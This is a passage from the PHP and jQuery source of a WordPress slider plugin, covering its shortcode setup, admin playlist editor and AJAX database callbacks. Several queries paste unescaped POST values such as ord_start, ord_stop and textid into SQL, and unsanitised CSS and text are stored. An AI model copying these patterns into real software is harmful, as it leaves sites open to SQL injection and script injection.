				behindCircleColor:"#'.$row["behindCircleColor"].'",
				behindCircleAlpha:'.$row["behindCircleAlpha"].',
				responsive:'.$row["responsive"].',
				responsiveRelativeToBrowser:'.$row["responsiveRelativeToBrowser"].',
				numberOfThumbsPerScreen:'.$row["numberOfThumbsPerScreen"].',
				thumbsWrapperMarginTop:'.$row["thumbsWrapperMarginTop"].',
				thumbsOnMarginTop:'.$row["thumbsOnMarginTop"].'				
			});	
		});
	</script>	
            <div id="bannerscollection_zoominout_'.$row["id"].'"><ul class="bannerscollection_zoominout_list">'.$playlist_str.'</ul>'.$text_str.'</div>';
}



register_activation_hook(__FILE__,"lbg_zoominoutslider_activate"); //activate plugin and create the database
register_uninstall_hook(__FILE__, 'lbg_zoominoutslider_uninstall'); // on unistall delete all databases 
add_action('init', 'lbg_zoominoutslider_init_sessions');	// initialize sessions
add_action('init', 'lbg_zoominoutslider_load_styles');	// loads required styles
add_action('init', 'lbg_zoominoutslider_load_scripts');			// loads required scripts  
add_action('admin_menu', 'lbg_zoominoutslider_plugin_menu'); // create menus
add_shortcode('lbg_zoominoutslider', 'lbg_zoominoutslider_shortcode');				//LBG-ZOOMINOUT shortcode 
add_shortcode('lbg_kenburnsslider', 'lbg_zoominoutslider_shortcode');








/** OTHER FUNCTIONS **/

//stripslashes for an entire array
function lbg_zoominoutslider_unstrip_array($array){
	if (is_array($array)) {	
		foreach($array as &$val){
			if(is_array($val)){
				$val = lbg_zoominoutslider_unstrip_array($val);
			} else {
				$val = stripslashes($val);
				
			}
		}
	}
	return $array;
}











/* ajax update playlist record */

add_action('admin_head', 'lbg_zoominoutslider_update_playlist_record_javascript');

function lbg_zoominoutslider_update_playlist_record_javascript() {
	global $wpdb;
	//Set Your Nonce
	$lbg_zoominoutslider_update_playlist_record_ajax_nonce = wp_create_nonce("lbg_zoominoutslider_update_playlist_record-special-string");
	$lbg_zoominoutslider_add_text_record_ajax_nonce = wp_create_nonce("lbg_zoominoutslider_add_text_record-special-string");
	$lbg_zoominoutslider_delete_text_record_ajax_nonce = wp_create_nonce("lbg_zoominoutslider_delete_text_record-special-string");
?>




<script type="text/javascript" >
//delete the entire record
function lbg_zoominoutslider_delete_entire_record (delete_id) {
	jQuery("#lbg_zoominoutslider_sortable").sortable('disable');
	jQuery("#"+delete_id).css("display","none");
	//jQuery("#lbg_zoominoutslider_sortable").sortable('refresh');
	jQuery("#lbg_zoominoutslider_updating_witness").css("display","block");
	var data = "action=lbg_zoominoutslider_update_playlist_record&security=<?php echo $lbg_zoominoutslider_update_playlist_record_ajax_nonce; ?>&updateType=lbg_zoominoutslider_delete_entire_record&delete_id="+delete_id;
	// since 2.8 ajaxurl is always defined in the admin header and points to admin-ajax.php
	jQuery.post(ajaxurl, data, function(response) {
		jQuery("#lbg_zoominoutslider_sortable").sortable('enable');
		jQuery("#lbg_zoominoutslider_updating_witness").css("display","none");
		//alert('Got this from the server: ' + response);
	});		
}


function lbg_zoominoutslider_open_dialog(ord) {
	jQuery('#dialog'+ord).dialog({
		minWidth: 0.8*document.body.offsetWidth,
		minHeight: 500, position: [180,70],
		modal:true,
		zIndex: 100000,
		close: function(event, ui) {
			 jQuery(this).dialog('destroy'); 
			 jQuery(this).appendTo('#form-playlist-lbg_zoominoutslider-'+ord);
		} 
	});
}


function lbg_zoominoutslider_add_text_line(photoid) {
	var data ="action=lbg_zoominoutslider_add_text_record&security=<?php echo $lbg_zoominoutslider_add_text_record_ajax_nonce; ?>&photoid="+photoid;

	// since 2.8 ajaxurl is always defined in the admin header and points to admin-ajax.php
	jQuery.post(ajaxurl, data, function(response) {
		//alert('Got this from the server: ' + response);

		//var randNo=Math.floor(Math.random()*10000);
		//var textID=response;
		var textID=parseInt(response,10);
		jQuery("#photo_div"+photoid).append('<div id="draggable'+textID+'" class="my_draggable"><h2>&nbsp;</h2><textarea name="content'+textID+'" id="content'+textID+'" cols="30" rows="1">Text Here</textarea></div>');
		jQuery("#draggable"+textID).draggable( { 
			handle: 'h2',
			start: function(event, ui) {
				jQuery('#text_line_settings'+textID).css('background','#cccccc');
			},
			stop: function(event, ui) {
				jQuery('#text_line_settings'+textID).css('background','#ffffff');
			},
			drag: function(event, ui) { 
				jQuery('#data-initial-left'+textID).val(lbg_zoominoutslider_process_val(jQuery(this).css('left'),'left'));
				jQuery('#data-initial-top'+textID).val(lbg_zoominoutslider_process_val(jQuery(this).css('top'),'top'));
			}
		});

		var div_data='<div class="text_line_settings" id="text_line_settings'+textID+'">';
			div_data+='<table width="100%" border="0">';
			div_data+='<tr>';
			div_data+='<td>Initial Left:</td>';
			div_data+='<td><input name="data-initial-left'+textID+'" type="text" id="data-initial-left'+textID+'" size="10" value="0" /> px</td>';
			div_data+='<td>Initial Top:</td>';
			div_data+='<td><input name="data-initial-top'+textID+'" type="text" id="data-initial-top'+textID+'" size="10" value="0" /> px</td>';
			div_data+='<td>Final Left:</td>';
			div_data+='<td><input name="data-final-left'+textID+'" type="text" id="data-final-left'+textID+'" size="10" value="0" /> px</td>';
			div_data+='<td>Final Top:</td>';
			div_data+='<td><input name="data-final-top'+textID+'" type="text" id="data-final-top'+textID+'" size="10" value="0" /> px</td>';
			div_data+='</tr>';
			div_data+='<tr>';
			div_data+='<td>Duration:</td>';
			div_data+='<td><input name="data-duration'+textID+'" type="text" id="data-duration'+textID+'" size="10" value="0" /> s</td>';
			div_data+='<td>Initial Opacity:</td>';
			div_data+='<td><input name="data-fade-start'+textID+'" type="text" id="data-fade-start'+textID+'" size="10" value="0" /> (Value between 0-100)</td>';
			div_data+='<td>Delay:</td>';
			div_data+='<td><input name="data-delay'+textID+'" type="text" id="data-delay'+textID+'" size="10" value="0" /> s</td>';
			div_data+='<td>CSS Styles</td>';
			div_data+='<td><textarea name="css'+textID+'" id="css'+textID+'" cols="30" rows="3"></textarea></td>';
			div_data+='</tr>';
			div_data+='<tr>';
			div_data+='<td colspan="8"><div class="delete_text" onclick="lbg_zoominoutslider_delete_text_line('+textID+')">&nbsp;</div></td>';
			div_data+='</tr>';
			div_data+='</table>';
			div_data+='</div>';
	    	
		jQuery("#photo_div"+photoid).append(div_data);		
	});


}


function lbg_zoominoutslider_delete_text_line(textid) {
	jQuery('#text_line_settings'+textid).remove();
	jQuery('#draggable'+textid).draggable( "destroy" );
	jQuery('#draggable'+textid).remove();
	
	var data ="action=lbg_zoominoutslider_delete_text_record&security=<?php echo $lbg_zoominoutslider_delete_text_record_ajax_nonce; ?>&textid="+textid;

	// since 2.8 ajaxurl is always defined in the admin header and points to admin-ajax.php
	jQuery.post(ajaxurl, data, function(response) {
		//alert ("ok");
	});
}



function lbg_zoominoutslider_process_val(val,cssprop) {
	retVal=parseInt(val.substring(0, val.length-2))-50;
	if (cssprop=="top")
		retVal=retVal+32;
	return retVal;
}


jQuery(document).ready(function($) {
	if (jQuery('#lbg_zoominoutslider_sortable').length) {
		jQuery( '#lbg_zoominoutslider_sortable' ).sortable({
			placeholder: "ui-state-highlight",
			start: function(event, ui) {
	            ord_start = ui.item.prevAll().length + 1;
	        },
			update: function(event, ui) {
	        	jQuery("#lbg_zoominoutslider_sortable").sortable('disable');
	        	jQuery("#lbg_zoominoutslider_updating_witness").css("display","block");
				var ord_stop=ui.item.prevAll().length + 1;
				var elem_id=ui.item.attr("id");
				//alert (ui.item.attr("id"));
				//alert (ord_start+' --- '+ord_stop);
				var data = "action=lbg_zoominoutslider_update_playlist_record&security=<?php echo $lbg_zoominoutslider_update_playlist_record_ajax_nonce; ?>&updateType=change_ord&ord_start="+ord_start+"&ord_stop="+ord_stop+"&elem_id="+elem_id;
				// since 2.8 ajaxurl is always defined in the admin header and points to admin-ajax.php
				jQuery.post(ajaxurl, data, function(response) {
					jQuery("#lbg_zoominoutslider_sortable").sortable('enable');
					jQuery("#lbg_zoominoutslider_updating_witness").css("display","none");
					//alert('Got this from the server: ' + response);
				});			
			}
		});
	}


	

	
	<?php 
		$rows_count = $wpdb->get_var( "SELECT COUNT(*) FROM ". $wpdb->prefix . "lbg_kenburnsslider_playlist;");
		for ($i=1;$i<=$rows_count;$i++) {
	?>

	


		jQuery('#upload_img_button_zoominout_<?php echo $i?>').click(function() {
		 formfield = 'img';
		 the_i=<?php echo $i?>;
		 tb_show('', 'media-upload.php?type=image&amp;TB_iframe=true');
		 return false;
		});

		jQuery('#upload_thumbnail_button_zoominout_<?php echo $i?>').click(function() {
		 formfield = 'thumbnail';
		 the_i=<?php echo $i?>;
		 tb_show('', 'media-upload.php?type=image&amp;TB_iframe=true');
		 return false;
		});
		 


	

	jQuery("#form-playlist-lbg_zoominoutslider-<?php echo $i?>").submit(function(event) {

		/* stop form from submitting normally */
		event.preventDefault(); 
		
		//show loading image
		jQuery('#ajax-message-<?php echo $i?>').html('<img src="<?php echo plugins_url('lbg_zoominoutslider/images/ajax-loader.gif', dirname(__FILE__))?>" />');

		//alert (jQuery('#data-initial-left24').val());
		//var data = {
			//action: 'lbg_zoominoutslider_update_playlist_record',
			//security: '<?php echo $lbg_zoominoutslider_update_playlist_record_ajax_nonce; ?>',
			//whatever: 1234
		//};
		var data ="action=lbg_zoominoutslider_update_playlist_record&security=<?php echo $lbg_zoominoutslider_update_playlist_record_ajax_nonce; ?>&"+jQuery("#form-playlist-lbg_zoominoutslider-<?php echo $i?>").serialize();

		// since 2.8 ajaxurl is always defined in the admin header and points to admin-ajax.php
		jQuery.post(ajaxurl, data, function(response) {
			//alert('Got this from the server: ' + response);
			//alert(jQuery("#form-playlist-lbg_zoominoutslider-<?php echo $i?>").serialize());
			var new_img = '';
			if (document.forms["form-playlist-lbg_zoominoutslider-<?php echo $i?>"].img.value!='')
				new_img=document.forms["form-playlist-lbg_zoominoutslider-<?php echo $i?>"].img.value;
			jQuery('#top_image_'+document.forms["form-playlist-lbg_zoominoutslider-<?php echo $i?>"].id.value).attr('src',new_img);
			jQuery('#ajax-message-<?php echo $i?>').html(response);
		});
	});
	<?php } ?>
	
});
</script>
<?php
}

//lbg_zoominoutslider_update_playlist_record is the action=lbg_zoominoutslider_update_playlist_record

add_action('wp_ajax_lbg_zoominoutslider_update_playlist_record', 'lbg_zoominoutslider_update_playlist_record_callback');

function lbg_zoominoutslider_update_playlist_record_callback() {
	
	check_ajax_referer( 'lbg_zoominoutslider_update_playlist_record-special-string', 'security' ); //security=<?php echo $lbg_zoominoutslider_update_playlist_record_ajax_nonce; 
	global $wpdb;
	global $lbg_zoominoutslider_messages;
	$errors_arr=array();
	//$wpdb->show_errors();
	
	//delete entire record
	if ($_POST['updateType']=='lbg_zoominoutslider_delete_entire_record') {
		$delete_id=$_POST['delete_id'];
		$safe_sql=$wpdb->prepare("SELECT * FROM ".$wpdb->prefix."lbg_kenburnsslider_playlist WHERE id = %d",$delete_id);
		$row = $wpdb->get_row($safe_sql, ARRAY_A);
		$row=lbg_zoominoutslider_unstrip_array($row);

		//delete the entire record
		$wpdb->query($wpdb->prepare("DELETE FROM ".$wpdb->prefix."lbg_kenburnsslider_playlist WHERE id = %d",$delete_id));
		//delete texts
		$wpdb->query($wpdb->prepare("DELETE FROM ".$wpdb->prefix."lbg_kenburnsslider_texts WHERE photoid = %d",$delete_id));
		//update the order for the rest ord=ord-1 for > ord
		$wpdb->query($wpdb->prepare("UPDATE ".$wpdb->prefix."lbg_kenburnsslider_playlist SET ord=ord-1 WHERE bannerid = %d and  ord>".$row['ord'],$_SESSION['xid']));
	}

	//update elements order
	if ($_POST['updateType']=='change_ord') {
		$sql_arr=array();
		$ord_start=$_POST['ord_start'];
		$ord_stop=$_POST['ord_stop'];
		$elem_id=(int)$_POST['elem_id'];
		$ord_direction='+1';
		if ($ord_start<$ord_stop) 
			$sql_arr[]="UPDATE ".$wpdb->prefix."lbg_kenburnsslider_playlist SET ord=ord-1  WHERE bannerid = ".$_SESSION['xid']." and ord>".$ord_start." and ord<=".$ord_stop;
		else
			$sql_arr[]="UPDATE ".$wpdb->prefix."lbg_kenburnsslider_playlist SET ord=ord+1  WHERE bannerid = ".$_SESSION['xid']." and ord>=".$ord_stop." and ord<".$ord_start;
		$sql_arr[]="UPDATE ".$wpdb->prefix."lbg_kenburnsslider_playlist SET ord=".$ord_stop." WHERE id=".$elem_id;		
		
		//echo "elem_id: ".$elem_id."----ord_start: ".$ord_start."----ord_stop: ".$ord_stop;
		foreach ($sql_arr as $sql)
			$wpdb->query($sql);
	}
	
	
	
	//submit update
	if (empty($_POST['img']))
		$errors_arr[]=$lbg_zoominoutslider_messages['empty_img'];
		
	$theid=isset($_POST['id'])?$_POST['id']:0;
	if($theid>0 && !count($errors_arr)) {
		/*$except_arr=array('Submit'.$theid,'id','ord','action','security','updateType','uniqueUploadifyID');
		foreach ($_POST as $key=>$val){
			if (in_array($key,$except_arr)) {
				unset($_POST[$key]);
			}
		}*/
		//update playlist
		if ($_POST['data-initialZoom']=='')
			$_POST['data-initialZoom']=0;
			
		if ($_POST['data-finalZoom']=='')
			$_POST['data-finalZoom']=0;			
			
		if ($_POST['data-duration']=='')
			$_POST['data-duration']=0;				
			
		$wpdb->update( 
			$wpdb->prefix .'lbg_kenburnsslider_playlist',
				array( 
				'img' => $_POST['img'],
				'thumbnail' => $_POST['thumbnail'],
				'alt_text' => $_POST['alt_text'],
				'data-video' => $_POST['data-video'],
				'data-link' => $_POST['data-link'],
				'data-target' => $_POST['data-target'],
				'content' => $_POST['content'],
				'data-horizontalPosition' => $_POST['data-horizontalPosition'],
				'data-verticalPosition' => $_POST['data-verticalPosition'],
				'data-initialZoom' => $_POST['data-initialZoom'],
				'data-finalZoom' => $_POST['data-finalZoom'],
				'data-duration' => $_POST['data-duration']					
				), 
			array( 'id' => $theid )
		);
		
		//update texts
		$safe_sql=$wpdb->prepare( "SELECT * FROM (".$wpdb->prefix ."lbg_kenburnsslider_texts) WHERE photoid = %d ORDER BY id",$theid );
		$result_text = $wpdb->get_results($safe_sql,ARRAY_A);
		
		foreach ( $result_text as $row_text ) {
			$textid=$row_text['id'];
			$wpdb->update( 
				$wpdb->prefix .'lbg_kenburnsslider_texts',
					array( 
					'content' => $_POST['content'.$textid],
					'data-initial-left' => $_POST['data-initial-left'.$textid],
					'data-initial-top' => $_POST['data-initial-top'.$textid],
					'data-final-left' => $_POST['data-final-left'.$textid],
					'data-final-top' => $_POST['data-final-top'.$textid],
					'data-duration' => $_POST['data-duration'.$textid],
					'data-fade-start' => $_POST['data-fade-start'.$textid],
					'data-delay' => $_POST['data-delay'.$textid],
					'css' => $_POST['css'.$textid]
					), 
				array( 'id' => $textid )
			);
		}

		?>
			<div id="message" class="updated"><p><?php echo $lbg_zoominoutslider_messages['data_saved'];?></p></div>
	<?php 
	} else if (!isset($_POST['updateType'])) {
		$errors_arr[]=$lbg_zoominoutslider_messages['invalid_request'];
	}
    //echo $theid;
    
	if (count($errors_arr)) { ?>
		<div id="error" class="error"><p><?php echo implode("<br>", $errors_arr);?></p></div>
	<?php }

	die(); // this is required to return a proper result
}




add_action('wp_ajax_lbg_zoominoutslider_add_text_record', 'lbg_zoominoutslider_add_text_record_callback');

function lbg_zoominoutslider_add_text_record_callback() {
	
	check_ajax_referer( 'lbg_zoominoutslider_add_text_record-special-string', 'security' ); //security=<?php echo $lbg_zoominoutslider_update_playlist_record_ajax_nonce; 
	global $wpdb;
	//$wpdb->show_errors();
	
	$wpdb->insert( 
			$wpdb->prefix . "lbg_kenburnsslider_texts", 
			array( 
				'photoid' => $_POST['photoid'],
				'data-initial-left' => 0,
				'data-initial-top' => 0,
				'data-final-left' => 0,
				'data-final-top' => 0,
				'data-duration' => 0,
				'data-fade-start' => 0,
				'data-delay' => 0
			), 
			array( 
				'%d', 
				'%d',
				'%d',
				'%d',
				'%d',
				'%f',
				'%d',
				'%f'
			) 
		);

		echo $wpdb->insert_id;
		
		die(); // this is required to return a proper result
}




add_action('wp_ajax_lbg_zoominoutslider_delete_text_record', 'lbg_zoominoutslider_delete_text_record_callback');

function lbg_zoominoutslider_delete_text_record_callback() {
	
	check_ajax_referer( 'lbg_zoominoutslider_delete_text_record-special-string', 'security' ); //security=<?php echo $lbg_zoominoutslider_update_playlist_record_ajax_nonce; 
	global $wpdb;
	//$wpdb->show_errors();
	
	
	$wpdb->query(
	"
	DELETE FROM ".$wpdb->prefix ."lbg_kenburnsslider_texts
	WHERE id = ".$_POST['textid']."
	"
	);

		
	die(); // this is required to return a proper result
}

?>